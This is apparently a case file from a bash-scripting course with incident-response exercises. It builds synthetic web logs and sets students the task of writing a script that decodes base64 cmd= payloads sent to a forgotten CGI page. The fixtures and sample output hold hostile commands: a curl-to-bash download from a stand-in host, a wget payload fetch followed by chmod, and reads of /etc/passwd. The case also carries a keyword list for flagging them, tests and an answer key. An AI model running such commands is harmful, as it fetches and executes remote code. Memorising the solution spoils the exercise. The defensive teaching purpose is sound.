import { defineFixture } from '../fixtures';
import { dir, GID, homeDir, put } from '../fixtures/base';
import { accessLog, apacheTime } from '../fixtures/gen';
import type { CaseFile } from '../types';

// The attacker drove a forgotten diagnostics CGI with base64 in a cmd= parameter.
// Every payload is encoded WITHOUT a trailing newline. Only artifacts: nothing here is ever executed.
const UA = 'python-requests/2.31.0';
const probe = (ip: string, t: number, query: string, status = 200, size = 64) => ({
  t,
  line: `${ip} - - [${apacheTime(t)}] "GET /cgi-bin/diag.cgi${query} HTTP/1.1" ${status} ${size} "-" "${UA}"`,
});
const at = (d: number, h: number, m: number, s: number) => Date.UTC(2026, 2, d, h, m, s);

const WEB01 = '198.51.100.23'; // web01's intruder: raj's account was used from here at Mar 13 23:51
const WEB02 = '192.0.2.145';

/** accessLog() invents random visitor IPs; move them into the 203.0.113.0/24 documentation range. */
function docRange(log: string): string {
  const seen = new Map<string, string>();
  return log.replace(/^\d+\.\d+\.\d+\.\d+(?= )/gm, (ip) => {
    if (ip === WEB01 || ip === WEB02) return ip;
    if (!seen.has(ip)) seen.set(ip, `203.0.113.${120 + seen.size}`);
    return seen.get(ip)!;
  });
}

defineFixture('case-decoder', (vfs) => {
  homeDir(vfs, 'cases');
  const log = docRange(accessLog({
    seed: 1613,
    start: at(13, 22, 0, 0),
    end: at(14, 3, 0, 0),
    normal: 70,
    extra: [
      probe(WEB01, at(13, 23, 57, 52), '', 200, 341), // the bare page: recon, no payload
      probe(WEB01, at(13, 23, 58, 10), '?cmd=aWQ=', 200, 52), // id
      probe(WEB01, at(13, 23, 58, 47), '?cmd=dW5hbWUgLWE=', 200, 118), // uname -a
      probe(WEB01, at(14, 0, 3, 5), '?cmd=Y2F0IC9ldGMvcGFzc3dk', 200, 1873), // cat /etc/passwd
      probe(WEB01, at(14, 0, 11, 52), '?cmd=..%2f..%2fetc%2fpasswd', 500, 612), // path traversal, not base64
      probe(WEB01, at(14, 0, 30, 17), '?cmd=Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC43Ny91LnNoIHwgYmFzaA==&t=1', 200, 0), // curl … | bash
    ],
  }));
  put(vfs, '/var/log/apache2/access.log', log, { mode: 0o640, gid: GID.adm, mtime: at(14, 12, 0, 0) });
});

// Hidden: web02's log in an evidence folder with a space in its name. cmd= isn't always the first
// parameter, one payload had its "=" URL-encoded (base64 -d prints "cat /etc/hosts", then fails).
defineFixture(
  'case-decoder-web02',
  (vfs) => {
    dir(vfs, '/srv/incident 0314');
    put(
      vfs,
      '/srv/incident 0314/web02-access.log',
      docRange(accessLog({
        seed: 1661,
        start: at(14, 1, 0, 0),
        end: at(14, 5, 0, 0),
        normal: 55,
        extra: [
          probe(WEB02, at(14, 2, 10, 3), '?cmd=d2hvYW1p', 200, 41), // whoami
          probe(WEB02, at(14, 2, 10, 30), '?v=2&cmd=bHMgLWxhIC92YXIvd3d3', 200, 902), // ls -la /var/www
          probe(WEB02, at(14, 2, 14, 11), '?cmd=Y2F0IC9ldGMvaG9zdHM%3D', 500, 612), // URL-encoded padding
          probe(WEB02, at(14, 2, 15, 40), '?cmd=d2dldCAtcSAtTyAvdG1wLy54L20gaHR0cDovLzIwMy4wLjExMy45OS9t&t=2', 200, 0), // wget …
          probe(WEB02, at(14, 2, 16, 2), '?cmd=Y2htb2QgK3ggL3RtcC8ueC9t', 200, 0), // chmod +x /tmp/.x/m
          probe(WEB02, at(14, 2, 20, 45), '?cmd=Y3JvbnRhYiAtbA==', 200, 77), // crontab -l
          probe(WEB02, at(14, 2, 31, 9), '?cmd=%60id%60', 500, 612), // backticks, not base64
        ],
      })),
      { mode: 0o644 },
    );
  },
  'case-decoder',
);

// Hidden: the intranet server, where nothing happened.
defineFixture(
  'case-decoder-clean',
  (vfs) => {
    dir(vfs, '/srv/logs');
    put(vfs, '/srv/logs/intranet-access.log', docRange(accessLog({ seed: 1620, normal: 45 })), { mode: 0o644 });
  },
  'case-decoder',
);

export const case04: CaseFile = {
  id: 'decoder',
  number: 4,
  title: 'Log Decoder',
  day: 16,
  difficulty: 3,
  minutes: 45,
  brief: `The web log from web01 has a second chapter. Seven minutes after Raj’s account was used, the same address, \`198.51.100.23\`, started calling \`/cgi-bin/diag.cgi\` — a diagnostics page everyone forgot about — with a \`cmd=\` parameter full of base64. Every one of those requests is a command the attacker asked our server to run.

I want to read them all, in order, without anyone pasting blobs into a terminal by hand. Write \`decoder.sh\`: give it an access log, and it decodes every \`cmd=\` payload, flags the dangerous ones, and tells me which ones aren’t base64 at all.

I’ll run it on other servers’ logs too. Evidence folders get named by tired humans, so expect spaces in paths. And it **decodes only**. Nothing it finds gets executed. Ever.

— Mara`,
  requirements: [
    'Usage: `decoder.sh LOGFILE`. No argument, or more than one → usage message to stderr, **exit 2**.',
    'A log that doesn’t exist or can’t be read → message to stderr, **exit 1**.',
    'Line 1: `Decoder report: LOGFILE` (the argument exactly as given).',
    'A **payload** is the text after `cmd=`, up to the next space or `&`. Report every payload in log order, by the **line number** it has in the log.',
    'If `base64 -d` decodes it: `line N: TEXT`. If decoding fails: `line N: (not base64)`, and none of the partly decoded text may appear.',
    'When TEXT contains `curl`, `wget`, `chmod` or `crontab`, add two spaces and `[SUSPICIOUS]` to the end of its line.',
    'Last line: `Payloads: P  Suspicious: S  Undecodable: U` (two spaces between the parts; any of them may be 0). Exit 0.',
  ],
  usage: 'bash ~/cases/decoder.sh /var/log/apache2/access.log',
  sampleOutput: `Decoder report: /var/log/apache2/access.log
line 28: id
line 29: uname -a
line 32: cat /etc/passwd
line 33: (not base64)
line 40: curl -s http://198.51.100.77/u.sh | bash  [SUSPICIOUS]
Payloads: 5  Suspicious: 1  Undecodable: 1`,
  scriptPath: '~/cases/decoder.sh',
  fixture: 'case-decoder',
  starter: `#!/bin/bash
# decoder.sh LOGFILE — decode the base64 cmd= payloads hidden in a web access log
# Usage: bash ~/cases/decoder.sh /var/log/apache2/access.log

log=$1

# TODO: exactly one argument, or a usage message to stderr and exit 2
# TODO: a log that can't be read: message to stderr, exit 1

echo "Decoder report: $log"

payloads=0
suspicious=0
undecodable=0

# grep -n -o 'cmd=[^ &]*' "$log" prints one match per line, like:  64:cmd=aWQ=
# TODO: loop over those matches (while IFS=: read -r n match; do …; done < <(…))
# TODO: decode each payload: "line N: TEXT", or "line N: (not base64)" if base64 -d fails
# TODO: add "  [SUSPICIOUS]" when TEXT contains curl, wget, chmod or crontab

echo "Payloads: $payloads  Suspicious: $suspicious  Undecodable: $undecodable"
`,
  tests: [
    { name: 'web01 access log', args: ['/var/log/apache2/access.log'], check: { output: 'reference' } },
    { name: 'Hidden: web02, in a folder with a space', args: ['/srv/incident 0314/web02-access.log'], fixture: 'case-decoder-web02', check: { output: 'reference' } },
    { name: 'Hidden: a clean log, nothing to decode', args: ['/srv/logs/intranet-access.log'], fixture: 'case-decoder-clean', check: { output: 'reference' } },
    { name: 'No arguments → exit 2', args: [], check: { status: 2 } },
    { name: 'Two logs at once → exit 2', args: ['/var/log/apache2/access.log', '/var/log/syslog'], check: { status: 2 } },
    { name: 'Missing log → exit 1', args: ['/var/log/apache2/nope.log'], check: { status: 1 } },
    { name: 'Unreadable file → exit 1', args: ['/etc/shadow'], check: { status: 1 } },
  ],
  solution: `#!/bin/bash
# decoder.sh LOGFILE — decode the base64 cmd= payloads hidden in a web access log
# Usage: bash ~/cases/decoder.sh /var/log/apache2/access.log

if [ $# -ne 1 ]; then
  echo "Usage: decoder.sh LOGFILE" >&2
  exit 2
fi
log=$1
if [ ! -f "$log" ] || [ ! -r "$log" ]; then
  echo "Cannot read $log" >&2
  exit 1
fi

echo "Decoder report: $log"

payloads=0
suspicious=0
undecodable=0

# grep -n -o prints one match per line, like  64:cmd=aWQ=
while IFS=: read -r n match; do
  b64=\${match#cmd=}
  payloads=$((payloads + 1))
  # decode into a variable; print it only if base64 -d succeeded (never run it)
  if decoded=$(printf '%s' "$b64" | base64 -d 2>/dev/null); then
    case $decoded in
      *curl*|*wget*|*chmod*|*crontab*)
        echo "line $n: $decoded  [SUSPICIOUS]"
        suspicious=$((suspicious + 1))
        ;;
      *)
        echo "line $n: $decoded"
        ;;
    esac
  else
    echo "line $n: (not base64)"
    undecodable=$((undecodable + 1))
  fi
done < <(grep -n -o 'cmd=[^ &]*' "$log")

echo "Payloads: $payloads  Suspicious: $suspicious  Undecodable: $undecodable"
`,
  walkthrough: `**How it works**

- **Guards first.** \`$# -ne 1\` catches both “nothing” and “too much” (exit 2). \`-f\` and \`-r\` together catch a missing file, a folder and a file you’re not allowed to read (exit 1). Both messages go to stderr, so they never end up inside a report someone pipes elsewhere.
- **\`grep -n -o 'cmd=[^ &]*'\`** does the extraction: \`-o\` prints only the match, \`-n\` puts the log’s line number in front, and \`[^ &]*\` stops at the space before \`HTTP/1.1\` or at the \`&\` that starts the next parameter.
- **\`IFS=: read -r n match\`** splits \`64:cmd=aWQ=\` at the colon, and \`\${match#cmd=}\` trims the prefix (Day 15).
- **\`if decoded=$( … | base64 -d 2>/dev/null)\`** is the key line. An assignment takes on the exit status of its \`$( )\`, so one \`if\` both captures the text and asks whether decoding worked. This matters because \`base64 -d\` prints whatever it managed to decode **before** it fails: \`Y2F0IC9ldGMvaG9zdHM%3D\` gives \`cat /etc/hosts\` and then exit status 1. Print first and check later, and that half-truth lands in your report.
- **\`printf '%s'\`** hands over the payload exactly as it is. \`echo\` would choke on a payload that happens to be \`-n\` or \`-e\`.
- **\`case $decoded in *curl*|*wget*|…)\`** is “contains any of these”, written as glob patterns.
- **\`done < <( … )\`** keeps the loop in the main shell, so the three counters survive it (Day 14).
- The decoded text is only ever **printed**. Nothing in the script runs it, and nothing should.

**Going further:** web servers and attack tools often URL-encode characters (\`%3D\` is \`=\`, \`%2f\` is \`/\`). Decode those first and \`Y2F0IC9ldGMvaG9zdHM%3D\` gives up its secret. Then run Day 13’s IP and URL regexes over the decoded text to turn this report into a list of IOCs.`,
  hints: [
    'Guards: `if [ $# -ne 1 ]; then echo "Usage: decoder.sh LOGFILE" >&2; exit 2; fi`, then `[ -r "$log" ]` (and `-f`) for exit 1.',
    "Loop over the matches with `while IFS=: read -r n match; do …; done < <(grep -n -o 'cmd=[^ &]*' \"$log\")`, and strip the prefix with `b64=${match#cmd=}`.",
    "Decode and test in one go: `if decoded=$(printf '%s' \"$b64\" | base64 -d 2>/dev/null); then … else … fi`. Print `$decoded` only in the `then` branch.",
    'Flag the dangerous ones with `case $decoded in *curl*|*wget*|*chmod*|*crontab*) … ;; *) … ;; esac`, and count all three kinds with `$(( ))`.',
  ],
  xp: 350,
};
